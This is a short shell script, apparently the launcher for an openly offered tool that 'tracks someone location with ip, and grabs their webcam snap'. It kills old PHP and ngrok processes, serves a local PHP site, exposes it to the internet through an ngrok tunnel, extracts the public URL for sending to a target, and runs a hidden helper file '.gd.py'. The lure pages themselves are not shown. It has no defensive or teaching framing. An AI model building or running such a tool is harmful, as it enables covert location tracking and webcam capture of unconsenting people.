#!/bin/sh
# Set local port from command line arg or default to 8080
echo "track someone location with ip, and grab their webcam snap"
echo "coded by @ridzwanirawan"
echo
echo "NOTE : TURN ON YOUR MOBILE HOTSPOT FIRST"
read -p 'Press enter to continue: ' continue
pkill -9 php &>/dev/null &
pkill -9 ngrok &>/dev/null &
killall php &>/dev/null &
killall ngrok &>/dev/null &
LOCAL_PORT=${1-8080}
echo "Starting php localhost on port [ $LOCAL_PORT ]"
nohup php -S localhost:${LOCAL_PORT} &>/dev/null &
echo "Starting ngrok on port [ $LOCAL_PORT ]"
nohup ngrok http ${LOCAL_PORT} &>/dev/null &

echo -n "Extracting ngrok public url ."
NGROK_PUBLIC_URL=""
while [ -z "$NGROK_PUBLIC_URL" ]; do
  # Run 'curl' against ngrok API and extract public (using 'sed' command)
  export NGROK_PUBLIC_URL=$(curl --silent --max-time 10 --connect-timeout 5 \
                            --show-error http://127.0.0.1:4040/api/tunnels | \
                            sed -nE 's/.*public_url":"https:..([^"]*).*/\1/p')
  sleep 1
  echo -n "."
done

echo
echo "Ngrok url : $NGROK_PUBLIC_URL"
export NGROK_PUBLIC_URL
python2 .gd.py
